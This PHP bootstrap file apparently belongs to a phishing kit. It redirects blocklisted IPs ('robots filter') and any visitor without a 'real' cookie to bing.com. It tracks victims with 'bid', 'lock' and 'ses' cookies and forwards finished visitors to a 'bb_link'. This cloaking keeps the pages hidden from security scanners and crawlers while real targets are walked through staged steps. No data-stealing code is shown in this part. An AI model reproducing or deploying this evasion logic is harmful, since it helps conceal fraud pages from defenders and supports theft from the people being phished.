<?php

if (empty($_SERVER['HTTPS']) || $_SERVER['HTTPS'] === 'off') {$protocol = 'http://';} else { $protocol = 'https://';}
DEFINE('DIR_URL', $protocol . $_SERVER['SERVER_NAME'] . dirname($_SERVER['PHP_SELF']) . '/'); //url

function get_full_url()
{

    $di         = basename(dirname(__file__));
    $di_pattern = "/\/$di\//";

    if (preg_match_all($di_pattern, DIR_URL) > 1) {
        die('Error:You cannot use same names of folders in the url. Try to rename "' . $di . '" folder to something else ');
    }

    $full_url = explode('/' . $di . '/', DIR_URL);
    return $full_url[0] . '/' . $di . '/';
}
//this cfg file full url link
DEFINE('FULL_URL', get_full_url());


header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');



// robots filter
$ip_ = $_SERVER['REMOTE_ADDR'];

$ips = is_array(unserialize(file_get_contents(__dir__ . '/ips.db'))) ? unserialize(file_get_contents(__dir__ . '/ips.db')) : array(); //

if (in_array($ip_, $ips)) {
    header('location:https://www.bing.com');exit;
}
// robots filter

//sesssion
if (!isset($_COOKIE["real"])) {
    header('location:https://www.bing.com');exit;
}
;
//sesssion

if (isset($_GET['bid']) && strlen($_GET['bid']) > 0) {
    setcookie('bid', $_GET['bid'], time() + (86400 * 30), "/");

    $_COOKIE['bid'] = $_GET['bid']; //workaroind runtime cookies set 2019

}

if (isset($_COOKIE["lock"])) {

    $lock = $_COOKIE["lock"];
    if (basename(dirname($_SERVER['PHP_SELF'])) != $lock) {
        header('location:../' . $lock . '/?' . $_SERVER['QUERY_STRING']);exit;
    }
}




$detect = new Mobile_Detect;

$device = new stdClass();

$device->isMobile  = $detect->isMobile();
$device->isTablet  = $detect->isTablet();
$device->isiOS     = $detect->isiOS();
$device->isAndroid = $detect->isAndroidOS();

$php_js->device = $device;

// $ref=$_GET['ref'];
// if($ref!="13579"){
//   header('location:https://bing.com');
// }

$php_js->gets = $_GET;

if (isset($_GET['op'])) {
    $php_js->op = base64_decode($_GET['op']);
}

function ses($bb_link, $start)
{

    $folders       = explode('/', $_SERVER['REQUEST_URI']);
    $count         = count($folders);
    $curent_folder = $folders[$count - 2];

    if ($curent_folder != $start) {
        if (!isset($_COOKIE['ses'])) {
            header("location:../" . $start);
            exit;
        } else {
            unset($_COOKIE['ses']);
            setcookie('ses', '', time() - 3600, '/');

        }
    }

    if (isset($_COOKIE['done'])) {
        header("location:" . $php_js->bb_link);
        exit;
    }

}
